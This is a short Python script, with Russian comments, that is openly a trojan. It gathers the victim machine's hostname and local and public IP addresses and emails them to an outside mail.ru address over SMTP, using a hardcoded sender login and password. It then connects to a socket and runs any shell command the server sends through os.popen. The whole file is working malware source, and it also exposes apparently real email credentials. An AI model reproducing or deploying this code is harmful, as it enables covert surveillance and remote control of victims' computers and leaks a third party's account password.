import smtplib as smtp
import random
import socket
import threading
import os
from getpass import getpass
from requests import get

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('http://api.ipify.org').text

def trojan():
    # IP-адрес атакуемого
    HOST = f'{public_ip}'
    # Порт, по которому мы работаем
    PORT = 9090
    # Создаем эхо-сервер
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    while True:
        # Вводим команду серверу
        server_command = client.recv(1024).decode('cp866')
        # Если команда совпала с ключевым словом 'cmdon', запускаем режим работы с терминалом
        if server_command == 'cmdon':
            cmd_mode = True
            # Отправляем информацию на сервер
            client.send('Получен доступ к терминалу'.encode('cp866'))
            continue
        # Если команда совпала с ключевым словом 'cmdoff', выходим из режима работы с терминалом
        if server_command == 'cmdoff':
            cmd_mode = False
        # Если запущен режим работы с терминалом, вводим команду в терминал через сервер
        if cmd_mode:
            os.popen(server_command)
        # Если же режим работы с терминалом выключен — можно вводить любые команды
        else:
            if server_command == 'hello':
                print('Hello World!')
        # Если команда дошла до клиента — выслать ответ
        client.send(f'{server_command} успешно отправлена!'.encode('cp866'))
src_mail = 'pecik_228@mail.ru'
password_SMTP = 'uuQsFq9RiJMxgRmiwLuD'

dest_mail = 'quarkquest@mail.ru'

mail_text = (f'Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}')
message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(src_mail, dest_mail, 'IP', mail_text)

server = smtp.SMTP_SSL('smtp.mail.ru')

server.login(src_mail, password_SMTP)
server.auth_plain()
server.sendmail(src_mail, dest_mail, message)
server.quit()

trojan()